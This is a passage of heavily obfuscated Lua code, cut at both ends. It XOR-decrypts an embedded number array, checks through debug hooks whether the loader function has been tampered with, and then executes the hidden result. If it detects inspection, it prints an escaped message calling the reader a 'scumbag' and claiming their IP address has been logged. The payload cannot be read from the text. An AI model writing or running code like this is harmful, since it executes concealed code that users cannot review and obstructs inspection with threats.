      [dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('16') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('DF') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('2C') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('71')](
      q) end
    ; n(sCdCYGd1SABXjGED9JlliV2ndQRru1z19OPLzU1gW7popY3FC1mK)
  end; iaqTO8IDo6NAwD1XPRBkYNMEjNfc1sT8gIIgcX5rkSvl5UJvlet6Tptzo5VnvwZSqc(f,
    function(r) fjpp35vED6n5V8CxfkiO7JhJ5EonufkMqC8uQtKHdGtrmo0gEgH9CUfcI5aMwm9CoWHfl(r, g,
        function(s) xsKFUdWhenj5AEQgiev7Bg4tOkMi3Shl9ALaDII3d0Ovqt50uk6V4Zxl2oNIxToAE76HSKHaZ(s,
            function(t) if #yqwL40aSb7iF8JlN4qEQSkujqo9ccIiNAm3KrWm6ADmjyuebHH3fFrXG0i(lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB[dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('B3') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('92') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('2C') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('0B')]) == 1 then if lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB[dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('B3') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('92') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('2C') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('0B')] == lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB[dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('87') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('71') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('D4') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('9D') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('5B')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB[dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('B3') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('92') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('2C') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('0B')](t) then
                    lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB
                        [dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('B3') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('92') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('2C') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('0B')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; kxXfhgfJWmbI9wHkKtLkblBrcqN0KviXgCjbNWmoudUSDiCxkLHjZryciz(
{ 1202, 1059, 1039, 1191, 741, 735, 851, 1079, 1050, 782, 584, 948, 978, 955, 615, 717, 636, 696, 822, 660, 968, 913,
  697, 691, 840, 776, 733, 1171, 935, 1185, 1001, 723, 938, 817, 738, 551, 1056, 578, 1106, 918, 1060, 837, 1117, 886,
  772, 699, 903, 710, 827, 588, 881, 623, 1005, 1126, 1069, 562, 752, 742, 909, 1178, 933, 1148, 1091, 1123, 998, 577,
  643, 1155, 993, 856, 1033, 1058, 859, 1067, 1125, 1165, 872, 692, 783, 612, 585, 1020, 1163, 727, 548, 1010, 1116, 779,
  1198, 687, 958, 749, 1025, 896, 863, 838, 563, 804, 665, 657, 701, 777, 681, 1036, 944, 1002, 674, 755, 716, 996, 953,
  582, 751, 767, 1012, 810, 676, 785, 1190, 730, 1195, 1151, 638, 949, 618, 546, 1115, 1205, 864, 883, 709, 925, 694,
  655, 1068, 732, 786, 606, 1154, 976, 891, 1137, 819, 877, 559, 1199, 760, 808, 1111, 927, 904, 722, 589, 957, 1070,
  639, 728, 1172, 1102, 761, 629, 934, 586, 1076, 878, 603, 947, 620, 1088, 1127, 1129, 1201, 1092, 579, 916, 942, 707,
  1073, 797, 632, 1206, 1173, 952, 1066, 1031, 1168, 739, 575, 663, 1014, 1011, 1188, 1071, 939, 828, 746, 820, 1046,
  855, 969, 983, 1110, 607, 757, 762, 591, 794, 769, 608, 554, 561, 544, 770, 1187, 829, 1169, 553, 1081, 656, 884, 932,
  715, 1029, 590, 1040, 753, 1194, 869, 1164, 985, 961, 940, 1003, 596, 1112, 1211, 1158, 979, 763, 1030, 936, 995, 839,
  610, 625, 860, 1150, 1152, 882, 1147, 990, 988, 792, 1022, 1004, 1084, 831, 1026, 806, 1041, 724, 901, 1049, 543, 879,
  600, 627, 574, 678, 557, 830, 677, 743, 908, 1042, 963, 868, 892, 876, 1089, 622, 583, 803, 1035, 1197, 1207, 1048,
  1087, 1141, 1027, 549, 613, 902, 1061, 1142, 818, 844, 919, 1186, 1013, 1109, 930, 850, 970, 824, 702, 690, 592, 680,
  875, 1212, 666, 1086, 759, 1145, 1179, 1134, 1182, 788, 737, 634, 1124, 1160, 668, 631, 711, 1099, 922, 651, 1104, 960,
  826, 997, 748, 798, 971, 602, 714, 1118, 555, 703, 1105, 647, 959, 973, 992, 768, 1097, 924, 946, 833, 801, 1051, 843,
  1122, 1101, 842, 624, 581, 915, 999, 683, 662, 962, 1037, 796, 1166, 917, 667, 572, 791, 867, 700, 635, 967, 661, 907,
  1028, 630, 812, 807, 984, 885, 964, 653, 945, 846, 1053, 626, 1021, 1119, 619, 560, 682, 1114, 573, 1176, 1193, 800,
  1093, 787, 1146, 914, 564, 693, 1095, 764, 1138, 698, 981, 1045, 654, 858, 950, 897, 799, 888, 734, 550, 1208, 1019,
  910, 1183, 1149, 1108, 571, 1007, 816, 899, 980, 713, 1107, 1017, 1018, 805, 1121, 1192, 956, 708, 718, 1113, 1100,
  890, 740, 1038, 566, 649, 754, 929, 1023, 688, 852, 912, 951, 926, 774, 1082, 570, 568, 862, 1189, 965, 552, 977, 1074,
  637, 1016, 911, 1034, 686, 873, 729, 576, 789, 547, 1210, 813, 1120, 658, 644, 1043, 825, 545, 887, 1136, 704, 841,
  1047, 642, 1006, 870, 580, 900, 640, 793, 750, 1157, 1055, 790, 765, 1096, 587, 845, 736, 893, 854, 747, 1133, 1064,
  898, 780, 880, 966, 1180, 1175, 849, 1090, 675, 894, 664, 756, 1140, 972, 954, 611, 1083, 1103, 1078, 994, 1032, 758,
  744, 617, 991, 989, 941, 720, 1085, 861, 1139, 974, 1170, -1, 35, 99, 85, 72, 100, 100, 45, 72, 52, 42, 14, 125, 122,
  12, 36, 221, 20, 13, 68, 39, 86, 12, 82, 55, 94, 0, 164, 93, 119, 113, 63, 53, 113, 105, 3, 16, 90, 103, 120, 61, 37,
  17, 18, 114, 120, 43, 87, 17, 96, 44, 213, 55, 69, 112, 247, 105, 120, 53, 220, 121, 112, 141, 228, 120, 106, 90, 235,
  127, 39, 54, 107, 10, 4, 143, 96, 113, 46, 13, 141, 119, 65, 87, 71, 53, 43, 2, 110, 85, 34, 118, 16, 27, 119, 0, 62,
  94, 31, 24, 230, 120, 28, 25, 2, 117, 49, 87, 61, 159, 111, 166, 62, 108, 54, 69, 46, 69, 151, 74, 25, 58, 119, 24, 40,
  74, 105, 93, 90, 96, 23, 99, 22, 1, 110, 53, 90, 92, 219, 75, 55, 54, 103, 250, 64, 115, 85, 20, 79, 55, 41, 31, 24, 7,
  94, 27, 22, 30, 95, 83, 25, 30, 28, 6, 173, 114, 127, 12, 104, 46, 25, 67, 22, 81, 97, 105, 68, 35, 253, 66, 205, 115,
  36, 16, 55, 64, 57, 80, 78, 69, 112, 61, 11, 80, 57, 119, 120, 83, 101, 116, 47, 55, 50, 109, 12, 88, 103, 98, 75, 122,
  22, 59, 72, 36, 34, 66, 101, 32, 122, 23, 104, 79, 44, 17, 92, 16, 119, 27, 11, 122, 131, 20, 197, 25, 85, 76, 103,
  181, 36, 4, 104, 35, 18, 189, 2, 104, 29, 104, 118, 45, 99, 16, 66, 107, 76, 63, 91, 67, 92, 7, 75, 160, 6, 80, 86, 58,
  69, 27, 41, 90, 181, 17, 83, 222, 29, 25, 116, 121, 103, 77, 211, 86, 232, 2, 75, 87, 12, 117, 118, 0, 16, 230, 103, 5,
  41, 162, 17, 68, 0, 58, 18, 86, 17, 69, 83, 17, 156, 166, 38, 11, 54, 121, 15, 25, 73, 11, 157, 65, 61, 81, 124, 28,
  66, 61, 8, 50, 82, 12, 18, 67, 108, 121, 65, 95, 34, 19, 27, 95, 103, 12, 121, 5, 50, 93, 86, 11, 17, 13, 26, 76, 12,
  4, 69, 83, 243, 25, 121, 94, 103, 121, 51, 102, 127, 127, 138, 195, 103, 25, 39, 118, 93, 6, 36, 125, 98, 81, 121, 75,
  79, 190, 103, 24, 99, 11, 60, 38, 12, 224, 45, 68, 155, 40, 26, 99, 6, 49, 91, 40, 30, 53, 22, 91, 59, 66, 45, 51, 86,
  73, 80, 110, 81, 69, 54, 33, 14, 33, 96, 43, 34, 86, 12, 87, 87, 87, 18, 94, 69, 120, 79, 11, 103, 72, 100, 54, 16,
  119, 120, 21, 22, 75, 95, 226, 71, 72, 36, 7, 167, 71, 85, 74, 71, 44, 69, 84, 61, 48, 120, 51, 67, 167, 60, 61, 52,
  52, 66, 98, 69, 72, 149, 42, 70, 22, 75, 96, 216, 45, 1, 13, 105, 100, 93, 30, 54, 180, 72, 34, 45, 75, 85, 39, 81, 16,
  25, 74, 51, 87, 6, 72, 13, 69, 77, 16, 103, 68, 122, 22, 125, 10, 6, 59, 85, 125, 103, 88, 42, 7, 108, 19, 10, 85, 120,
  166, 96, 25, 104, 104, 125, 105, 72, 117, 73, 164, 113, 1, 65, 127, 116, 120, 53, 119, 126, 93, 50, 39, 65, 78, 42, 96,
  4, 6, 2, 92, 50, 99, 80, 100, 50, 87, 6, 24, 72, 79, 104, 72, 33, 77, 94, 83, 19, 79, 94, 22, 60, 105, 6, 22, 69, 4,
  22, 119, 74, 69, 25, 50, 68, 47, 71, 204, 82, 13, 144, 196, 75, 49, 99, 0, 87, 11, 18, 122, 87, 93, 123, 208, 28, 77,
  11, 57, 120, 51, 85, 31, 50, 5, 66, 145, 13, 24, 211, 4, 255, 23, 39, 42, 107, 72, 84, 99, 127, 38, 53, 111, 20, 25,
  55, 42, 96, 51, 33, 20, 154, 34, 100, 55, 108, 107, 103, 112, 2, 5, 54, 120, 120, 38, 69, 219, 119, 0, 88, 99, 0, 104,
  212, 51, 41, 126, 72, 100, 240, 120, 46, 43 }, "bZhDIVDXsWe9Gku1ehvwXBcGY8"); gRau7bONRQLXiDtGyCPKKv3pLIedmXLuck5HQmlqTcDCvi6DZWiNquXSTKWjMuaK8fzAq =
lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB; ovOMfYKCDg1QXJBscPrryvsRy7dDLageTizbkavVnKXIogowjOE3AZxjfN6ghSt9qoi =
lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB; rqBAkrZ8fpsJN1l4QI9xniANhTDT7sl382cGtk2mDhUz6J0MV2fDnR =
ovOMfYKCDg1QXJBscPrryvsRy7dDLageTizbkavVnKXIogowjOE3AZxjfN6ghSt9qoi; xofJokel6swXdBr01Tr6DIQAX4vu0qYvRgfRTO9fG4Ck8Qhvdt7gFLmIMDXjPTcu4CxHZh =
rqBAkrZ8fpsJN1l4QI9xniANhTDT7sl382cGtk2mDhUz6J0MV2fDnR; nWkEH3ahGQPDyx1lFFUPluWSUzeAtzDuTcGbRG2K8bdePHa5HAbD4 =
xofJokel6swXdBr01Tr6DIQAX4vu0qYvRgfRTO9fG4Ck8Qhvdt7gFLmIMDXjPTcu4CxHZh; sGcssTQNbbBMbHeGirGN22Eafxi6XonKNocNRuJwuUCerkkAoJqqQAb5OgjJ =
nWkEH3ahGQPDyx1lFFUPluWSUzeAtzDuTcGbRG2K8bdePHa5HAbD4; wGoFVj1cdSgHZOB0umX7RABsYAOUJDHCzwn4elG5NZjNBjR4ir00py8doD8x69OcnPB1G4uQ =
sGcssTQNbbBMbHeGirGN22Eafxi6XonKNocNRuJwuUCerkkAoJqqQAb5OgjJ; yNqEcenpPRQdTJQ9EwP9MKAN22qkjhti2PLKu3s13TzuWR1uwJ3WFT1dqtmy3Mh =
wGoFVj1cdSgHZOB0umX7RABsYAOUJDHCzwn4elG5NZjNBjR4ir00py8doD8x69OcnPB1G4uQ; x4aoKpygV0wmFNT7fuAn0FxAv5cHO9NyHFYaCve1pcinndGzfpoGAPuBlrtty =
yNqEcenpPRQdTJQ9EwP9MKAN22qkjhti2PLKu3s13TzuWR1uwJ3WFT1dqtmy3Mh; oOM3rldqBmU4iJePdWBjClLOLk4YijwPRDs1cCC2NJDh8u560HbV3gDTXZn63SjCiDV1H27NUiI =
x4aoKpygV0wmFNT7fuAn0FxAv5cHO9NyHFYaCve1pcinndGzfpoGAPuBlrtty; h06RykuyQGUgJwOA8B0AThzWyoW5Adt8naQAHFM2JihwD5TnMauPUAzcqK4T9RK3fPnWrXslX =
oOM3rldqBmU4iJePdWBjClLOLk4YijwPRDs1cCC2NJDh8u560HbV3gDTXZn63SjCiDV1H27NUiI; lykivBTfc4EiHy3nsYXc9oyAjlZwgF1TbxsAXlcgO2V5hFwWTiA =
h06RykuyQGUgJwOA8B0AThzWyoW5Adt8naQAHFM2JihwD5TnMauPUAzcqK4T9RK3fPnWrXslX; jgi3s3DzLLypREcKtNZEIxoZnD4xcjDupstNj26BuqQ2eTnAmLhFTYRBNcYUQZ53gh =
lykivBTfc4EiHy3nsYXc9oyAjlZwgF1TbxsAXlcgO2V5hFwWTiA; iMcm1SUmDTQs78dvkVlXKy61fY1X7HczLyMQHsjgEFpgCyBRasCnPqJ9bPlowy62YLlSuHix0Li =
jgi3s3DzLLypREcKtNZEIxoZnD4xcjDupstNj26BuqQ2eTnAmLhFTYRBNcYUQZ53gh; shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl =
iMcm1SUmDTQs78dvkVlXKy61fY1X7HczLyMQHsjgEFpgCyBRasCnPqJ9bPlowy62YLlSuHix0Li; fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t = function(
  a)
  K, F = 4771733391006137, 16384 + 5851; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; o7zJVN8KrVlP0pjqYh5iLx2G6OuQNGeSvztqQOP8tdnMpp8RZtqad4 = function(b)
  co = coroutine.create(b)
  v45brTFFJ4hLwCF5FVIA7JOOsM8KIn94Pvpw3aQecQDPxM8HGdrrm0YtsZDu1EZzn = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(v45brTFFJ4hLwCF5FVIA7JOOsM8KIn94Pvpw3aQecQDPxM8HGdrrm0YtsZDu1EZzn, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return v45brTFFJ4hLwCF5FVIA7JOOsM8KIn94Pvpw3aQecQDPxM8HGdrrm0YtsZDu1EZzn
end; ayhEEWgz8DJsZ7tsuj5R8CLwBrPMYPzTGHMTxxkLQne4iRBD9Yn2PhzvYTMkj7 = function(f, g)
  sXIonkOeA0xcHL2gdZFJug1ZtSGcoTJRMQOW2IyRYl5Wmv5iQFL5k1TOBQwP050 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; wzogOIH8rLripfkdxF6j0kOte9E2UBgMigJRlXNppkKgcvnQJU7QX = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; rh6U1cUGX4EAJbsgdqeuBgQHGet20vJSe3FkeQ9fzTwVsrJQI8ArpeTrTLhnMi981YkFJYnbn = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      sXIonkOeA0xcHL2gdZFJug1ZtSGcoTJRMQOW2IyRYl5Wmv5iQFL5k1TOBQwP050(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; x7JOER3kPX6ohciVzhP4lERUeQxgHScdzib6jNS9Tqd8U7UHJ7qG4ZYDYyIoi1nphApg = function(p, n)
    ykt7RxiTwbYgyM6mEZtRzQ20WNoBNDM0xwMDSSGsrSb6XTNnWPb17pqHo = ""
    for k, q in pairs(p) do ykt7RxiTwbYgyM6mEZtRzQ20WNoBNDM0xwMDSSGsrSb6XTNnWPb17pqHo =
      ykt7RxiTwbYgyM6mEZtRzQ20WNoBNDM0xwMDSSGsrSb6XTNnWPb17pqHo ..
      shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl
      [fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('26') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('85') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('C7') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('70') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('4B') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('B2')]
      [fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('36') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('11') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('78') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('C7')](
      q) end
    ; n(ykt7RxiTwbYgyM6mEZtRzQ20WNoBNDM0xwMDSSGsrSb6XTNnWPb17pqHo)
  end; wzogOIH8rLripfkdxF6j0kOte9E2UBgMigJRlXNppkKgcvnQJU7QX(f,
    function(r) rh6U1cUGX4EAJbsgdqeuBgQHGet20vJSe3FkeQ9fzTwVsrJQI8ArpeTrTLhnMi981YkFJYnbn(r, g,
        function(s) x7JOER3kPX6ohciVzhP4lERUeQxgHScdzib6jNS9Tqd8U7UHJ7qG4ZYDYyIoi1nphApg(s,
            function(t) if #o7zJVN8KrVlP0pjqYh5iLx2G6OuQNGeSvztqQOP8tdnMpp8RZtqad4(shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl[fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('8D') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('AA') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('78') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('95')]) == 1 then if shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl[fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('8D') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('AA') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('78') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('95')] == shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl[fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('09') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('C7') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('70') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('4B') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('85')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl[fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('8D') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('AA') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('78') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('95')](t) then
                    shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl
                        [fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('8D') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('AA') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('78') .. fLR5HsukxWI47WcZkOwOVHbr9Ds95a9jv1KeAcj3j7U10gflKK66BcCDwRjVY9vslY4URm91t('95')](
                        t)() end end else print(
